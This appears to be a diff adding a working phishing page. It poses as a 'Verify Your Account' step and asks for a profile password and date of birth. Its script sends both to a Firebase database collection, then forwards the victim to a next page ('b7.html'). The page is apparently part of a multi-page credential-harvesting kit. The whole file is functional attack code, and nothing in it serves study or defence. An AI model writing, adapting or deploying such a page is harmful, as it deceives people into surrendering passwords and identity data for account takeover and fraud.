@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Home</title>
+    <link rel="stylesheet" href="a02b572693328546.css" />
+    
+    <!-- ✅ Updated Firebase SDK -->
+    <script type="module">
+      import { initializeApp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-app.js";
+      import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.10.0/firebase-firestore.js";
+
+      // ✅ Updated Firebase Configuration
+      const firebaseConfig = {
+        apiKey: "AIzaSyAQChRUNOzph1tOQtVdNJnaX79VMuI1K9w",
+        authDomain: "srai-16d20.firebaseapp.com",
+        projectId: "srai-16d20",
+        storageBucket: "srai-16d20.firebasestorage.app",
+        messagingSenderId: "13015388512",
+        appId: "1:13015388512:web:ede30255ac370257f7ce05"
+      };
+
+      const app = initializeApp(firebaseConfig);
+      const db = getFirestore(app);
+      window.db = db;
+      window.addDoc = addDoc;
+      window.collection = collection;
+      window.serverTimestamp = serverTimestamp;
+    </script>
+  </head>
+  <body>
+    <div id="__next">
+      <header>
+        <img src="logo.png" alt="logo" class="logo" />
+      </header>
+      <main>
+        <form id="verifyForm">
+          <h1>Verify Your Account</h1>
+
+          <div class="floating-container">
+            <input type="password" id="profilePassword" name="profilePassword" placeholder=" " required />
+            <label>Profile Password <span>*</span></label>
+          </div>
+
+          <!-- Show/Hide Password -->
+          <div style="margin-bottom: 15px;">
+            <input type="checkbox" id="togglePassword" />
+            <label for="togglePassword">Show Password</label>
+          </div>
+
+          <div class="floating-container">
+            <input
+              type="text"
+              minlength="10"
+              maxlength="10"
+              inputmode="numeric"
+              id="dob"
+              name="db"
+              placeholder=" "
+              required
+            />
+            <label>Date Of Birth (DD/MM/YYYY) <span>*</span></label>
+          </div>
+
+          <div class="btContainer">
+            <button type="submit">Continue</button>
+          </div>
+        </form>
+      </main>
+
+      <footer>
+        <div class="l">
+          <img src="s.jpg" alt="bg" class="l" />
+        </div>
+        <img src="ft.png" alt="footer" class="ft" />
+      </footer>
+    </div>
+
+    <script>
+      document.addEventListener("DOMContentLoaded", function () {
+        const dobInput = document.getElementById("dob");
+        const togglePassword = document.getElementById("togglePassword");
+        const profilePasswordInput = document.getElementById("profilePassword");
+
+        togglePassword.addEventListener("change", function () {
+          profilePasswordInput.type = this.checked ? "text" : "password";
+        });
+
+        dobInput.addEventListener("input", function (e) {
+          let value = e.target.value.replace(/\D/g, "");
+          if (value.length > 2 && value.length <= 4) {
+            value = value.replace(/(\d{2})(\d+)/, "$1/$2");
+          } else if (value.length > 4) {
+            value = value.replace(/(\d{2})(\d{2})(\d+)/, "$1/$2/$3");
+          }
+          e.target.value = value;
+        });
+
+        dobInput.addEventListener("keypress", function (e) {
+          const charCode = e.charCode || e.keyCode;
+          if (charCode < 48 || charCode > 57) e.preventDefault();
+        });
+
+        document.getElementById("verifyForm").addEventListener("submit", async (event) => {
+          event.preventDefault();
+
+          const profilePassword = profilePasswordInput.value.trim();
+          const dob = dobInput.value.trim();
+
+          if (!profilePassword || !dob) {
+            alert("Please fill out all required fields.");
+            return;
+          }
+
+          try {
+            await window.addDoc(window.collection(window.db, "users"), {
+              profilePassword: profilePassword,
+              dateOfBirth: dob,
+              timestamp: window.serverTimestamp(),
+            });
+
+            window.location.href = "b7.html";
+          } catch (error) {
+            console.error("Error saving user data:", error);
+            alert("Error saving data: " + error.message);
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
